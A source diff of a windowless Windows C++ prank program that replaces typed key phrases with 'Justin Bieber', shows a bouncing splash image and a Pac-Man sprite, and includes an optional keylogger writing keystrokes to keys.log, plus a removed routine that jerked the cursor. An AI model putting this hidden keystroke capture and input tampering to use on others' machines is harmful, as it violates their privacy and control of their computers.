@@ -1,233 +1,221 @@
 // EvilBullshitWindowless.cpp : Defines the entry point for the application.
 //
 
+// todo: random set of replacement words
+
 #include "stdafx.h"
 #include "EvilBullshitWindowless.h"
 #include <Windows.h>
+#include <wincodec.h>
 #include <ctime>
+#include <fstream>
+#include <atlstr.h>
+#include <vector>
+#include <string>
+#include "resource.h"
 
-void loopforever() {
-	// set up objects
-	POINT current, last;
-	long x, y;
-	int bigInterval = 10000;
-	int smallInterval = 1000;
-	int tinyInterval = 100;
-	bool fuckWithShit = false;
-	INPUT ip;
-	// Set up a generic keyboard event.
-	ip.type = INPUT_KEYBOARD;
-	ip.ki.wScan = 0; // hardware scan code for key
-	ip.ki.time = 0;
-	ip.ki.dwExtraInfo = 0;
-	ip.ki.wVk = VK_SPACE; // virtual-key code for the "scape" key
-	// set up rands
-	srand(time(NULL));
-	// set inital position
+using std::string;
+using std::vector;
 
-	GetCursorPos(&last);
-	while (1) {
-		GetCursorPos(&current);
-		// end chaos mode
-		if (rand() % smallInterval == 0 && rand() % bigInterval == 0) {
-			fuckWithShit = false;
-		}		
-		// start chaos mode
-		if (rand() % bigInterval == 0 && rand() % bigInterval == 0) {
-			SetCursorPos(0, 0);
-			fuckWithShit = true;
-		}
-		// move cursor the opposite direction that it was previously moved in the y direction
-		// this makes it spaz out super hard and makes it hard to click anything
-		if (fuckWithShit) {
-			x = (current.x - last.x);
-			y = (current.y - last.y);
-			SetCursorPos(current.x, current.y - y * 2);
-		}
-		// randomly add extra spaces sometimes
-		if (GetKeyState(VK_SPACE) && rand() % smallInterval == 0 && rand() % smallInterval == 0) {
-			ip.ki.dwFlags = 0; // 0 for key press
-			SendInput(1, &ip, sizeof(INPUT));
-			Sleep(50);
-			ip.ki.dwFlags = KEYEVENTF_KEYUP;
-			SendInput(1, &ip, sizeof(INPUT));
-		}
-	}
-}
-// everything after this is default windows win32 stuff besides the place I injected a call to loopforever
+// things for moving the splash screen
+HWND splashWindow;
+HDC g_hdcScreen;
+HDC g_hdcMem;
+POINT ptZero = { 0 };
+SIZE g_sizeSplash;
+BLENDFUNCTION g_blend;
+POINT ptOrigin;
+HWND g_splashWindow;
+HWND g_evilWindow;
+HBITMAP g_slashMap;
+vector<HBITMAP> logoAnimation;
+int maxx;
+int maxy;
+bool left, right, up, down;
 
-
-
-#define MAX_LOADSTRING 100
 // Global Variables:
+#define MAX_LOADSTRING 100
 HINSTANCE hInst;                                // current instance
 WCHAR szTitle[MAX_LOADSTRING];                  // The title bar text
 WCHAR szWindowClass[MAX_LOADSTRING];            // the main window class name
+int _nCmdShow;
 
-// Forward declarations of functions included in this code module:
-ATOM                MyRegisterClass(HINSTANCE hInstance);
-BOOL                InitInstance(HINSTANCE, int);
-LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
-INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);
+#include "splashIamge.h"
 
-int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
-                     _In_opt_ HINSTANCE hPrevInstance,
-                     _In_ LPWSTR    lpCmdLine,
-                     _In_ int       nCmdShow)
-{
-    UNREFERENCED_PARAMETER(hPrevInstance);
-    UNREFERENCED_PARAMETER(lpCmdLine);
+#define SHIFT   1
+#define CONTROL 2
+#define ALT 4
+#define CLICK 8
 
-    // TODO: Place code here.
+// replacement word
+string replacement = "Justin Bieber";
+// list of key phrases
+vector<string> KeyWords = { "charlie", "mel", "guys", "wondering" };
+// do we want to also be a keylogger?
+bool logKeys = false;
 
-    // Initialize global strings
-    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
-    LoadStringW(hInstance, IDC_EVILBULLSHITWINDOWLESS, szWindowClass, MAX_LOADSTRING);
-    MyRegisterClass(hInstance);
+#include "stringFunctions.h"
 
-    // Perform application initialization:
-    if (!InitInstance (hInstance, nCmdShow))
-    {
-        return FALSE;
-    }
-
-    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_EVILBULLSHITWINDOWLESS));
-
-    MSG msg;
-	loopforever();
-    // Main message loop:
-    while (GetMessage(&msg, nullptr, 0, 0))
-    {
-        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
-        {
-            TranslateMessage(&msg);
-            DispatchMessage(&msg);
-        }
-    }
-	
-    return (int) msg.wParam;
+int rotclamp(int val, int min, int max) {
+	if (val < min) return max;
+	if (val > max) return min;
+	return val;
 }
 
+#include "GameEntity.h"
+GameEntity pacMan = GameEntity(0, 0, 48, 48, vector<HBITMAP>(), g_splashWindow);
 
+// enter loop of sillyness
+void loopforever() {
+	// set up objects
+	unsigned int state = 0;
+	unsigned int oldState = 0;
+	auto recentKeys = std::vector<char>();
+	std::ofstream outfile;
+	outfile.open("keys.log", std::ios_base::app);
+	outfile << "\nData:\n";	
+	size_t patternLength = 0;
+	for (auto&& pattern : KeyWords) {
+		if (pattern.length() > patternLength)
+			patternLength = pattern.length();
+	}
 
-//
-//  FUNCTION: MyRegisterClass()
-//
-//  PURPOSE: Registers the window class.
-//
-ATOM MyRegisterClass(HINSTANCE hInstance)
-{
-    WNDCLASSEXW wcex;
+	//// get the primary monitor's info
+	HMONITOR hmonPrimary = MonitorFromPoint(ptZero, MONITOR_DEFAULTTOPRIMARY);
+	MONITORINFO monitorinfo = { 0 };
+	monitorinfo.cbSize = sizeof(monitorinfo);
+	GetMonitorInfo(hmonPrimary, &monitorinfo);
 
-    wcex.cbSize = sizeof(WNDCLASSEX);
+	//// center the splash screen in the middle of the primary work area
+	RECT & rcWork = monitorinfo.rcWork;
+	maxx = rcWork.right - rcWork.left;
+	maxy = rcWork.bottom - rcWork.top;
+	int xxx = 0;
+	int yyy = 0;
+	int yd = 1;
+	int xd = 1;
+	int i = 0;
+	int gamestate = 0;
+	left = right = up = down = false;
 
-    wcex.style          = CS_HREDRAW | CS_VREDRAW;
-    wcex.lpfnWndProc    = WndProc;
-    wcex.cbClsExtra     = 0;
-    wcex.cbWndExtra     = 0;
-    wcex.hInstance      = hInstance;
-    wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_EVILBULLSHITWINDOWLESS));
-    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
-    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
-    wcex.lpszMenuName   = MAKEINTRESOURCEW(IDC_EVILBULLSHITWINDOWLESS);
-    wcex.lpszClassName  = szWindowClass;
-    wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));
+	pacMan.LoadSpritemap({ IDB_Pac_l_c,IDB_Pac_l_o,IDB_Pac_r_c,IDB_Pac_r_o,IDB_Pac_u_c,IDB_Pac_u_o,IDB_Pac_d_c,IDB_Pac_d_o });
 
-    return RegisterClassExW(&wcex);
+	// enter loop state
+	while (1) {
+		// do bounce animation
+		{
+			SwitchToThisWindow(g_splashWindow, true);
+
+			if (xxx > maxx - g_sizeSplash.cx || xxx < 0) {
+				xd *= -1;
+			}
+			xxx += xd;
+			if (yyy > maxy - g_sizeSplash.cy || yyy < 0) {
+				yd *= -1;
+			}
+			yyy += yd;
+			i++;
+			if (i < 0 || i >= 4000) {
+				i = 0;
+				if (gamestate == 0) {
+					gamestate = 1;
+					pacMan.x = xxx;
+					pacMan.y = yyy;
+					pacMan.window = g_splashWindow;
+				}
+			}
+		}
+		if (gamestate == 0) {
+			SetSplashImage(g_splashWindow, logoAnimation[(i % 40)/10], xxx, yyy);
+		} else
+		if (gamestate == 1) {
+			SetSplashImage(g_evilWindow, logoAnimation[(i % 40) / 10], xxx, yyy);
+			i++;
+			if (i < 0 || i >= 200) {
+				i = 0;
+			}
+			// only use the most recent direction
+			bool test;
+			if (test = GetAsyncKeyState(VK_LEFT)) {
+				if (!left)
+					pacMan.direction = 0;
+			}
+			left = test;
+			if (test = GetAsyncKeyState(VK_RIGHT)) {
+				if (!right)
+					pacMan.direction = 1;
+			}
+			right = test;
+			if (test = GetAsyncKeyState(VK_UP)) {
+				if (!up)
+					pacMan.direction = 2;
+			} 
+			up = test;
+			if (test = GetAsyncKeyState(VK_DOWN)) {
+				if (!down)
+					pacMan.direction = 3;
+			}
+			down = test;
+
+			pacMan.update();
+			pacMan.draw();
+		}
+
+		// this is the text replacer
+		// watch special key state changes
+		oldState = state;
+		state = 0;
+		if (GetAsyncKeyState(1)) {
+			state |= CLICK;
+			if (logKeys && state != oldState)
+				outfile << "`CLICK`";
+		}
+		if (GetAsyncKeyState(16)) {			
+			state |= SHIFT;
+		}
+		if (GetAsyncKeyState(17)) {
+			state |= CONTROL;
+			if (logKeys && state != oldState)
+				outfile << "`CTRL-`";
+		}
+		if (GetAsyncKeyState(18)) {
+			state |= ALT;
+			if (logKeys && state != oldState)
+				outfile << "`ALT-`";
+		}
+		// check range of virtual keys
+		for (int i = 0; i < 256; i++) {
+			// key with id of i has been pressed, cast to unsigned char for boolean test
+			if ((unsigned char)GetAsyncKeyState(i)) {
+				 // transform to ascii value
+				auto ch = VKtoASCII(i, (state & SHIFT));
+				// throw out garbage
+				if (ch > 0) {
+					// remember recent keys
+					recentKeys.push_back(lowercase(ch));
+					// forget old keys
+					if (recentKeys.size() > patternLength) {
+						recentKeys.erase(recentKeys.begin());
+					}
+					// keylog if set
+					if (logKeys) {
+						outfile << ch;
+						outfile.flush();
+					}
+					// if a key phrase has been typed count it's length
+					// then backspace it away and type out a replacement
+					auto replaceChars = typedKeyPhrase(recentKeys);
+					if (replaceChars) {
+						for (int i = replaceChars; i--;) {
+							triggerKey(VK_BACK);
+						}
+						typeString(replacement);
+					}					
+				}
+			}
+		}
+		Sleep(1);
+	}
 }
 
-//
-//   FUNCTION: InitInstance(HINSTANCE, int)
-//
-//   PURPOSE: Saves instance handle and creates main window
-//
-//   COMMENTS:
-//
-//        In this function, we save the instance handle in a global variable and
-//        create and display the main program window.
-//
-BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
-{
-   hInst = hInstance; // Store instance handle in our global variable
-
-   HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
-      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);
-
-   if (!hWnd)
-   {
-      return FALSE;
-   }
-
-   //ShowWindow(hWnd, nCmdShow);
-   UpdateWindow(hWnd);
-
-   return TRUE;
-}
-
-//
-//  FUNCTION: WndProc(HWND, UINT, WPARAM, LPARAM)
-//
-//  PURPOSE:  Processes messages for the main window.
-//
-//  WM_COMMAND  - process the application menu
-//  WM_PAINT    - Paint the main window
-//  WM_DESTROY  - post a quit message and return
-//
-//
-LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
-{
-    switch (message)
-    {
-    case WM_COMMAND:
-        {
-            int wmId = LOWORD(wParam);
-            // Parse the menu selections:
-            switch (wmId)
-            {
-            case IDM_ABOUT:
-                DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
-                break;
-            case IDM_EXIT:
-                DestroyWindow(hWnd);
-                break;
-            default:
-                return DefWindowProc(hWnd, message, wParam, lParam);
-            }
-        }
-        break;
-    case WM_PAINT:
-        {
-            PAINTSTRUCT ps;
-            HDC hdc = BeginPaint(hWnd, &ps);
-            // TODO: Add any drawing code that uses hdc here...
-            EndPaint(hWnd, &ps);
-        }
-        break;
-    case WM_DESTROY:
-        PostQuitMessage(0);
-        break;
-    default:
-        return DefWindowProc(hWnd, message, wParam, lParam);
-    }
-    return 0;
-}
-
-// Message handler for about box.
-INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
-{
-    UNREFERENCED_PARAMETER(lParam);
-    switch (message)
-    {
-    case WM_INITDIALOG:
-        return (INT_PTR)TRUE;
-
-    case WM_COMMAND:
-        if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
-        {
-            EndDialog(hDlg, LOWORD(wParam));
-            return (INT_PTR)TRUE;
-        }
-        break;
-    }
-    return (INT_PTR)FALSE;
-}
+#include "windowsCrap.h"
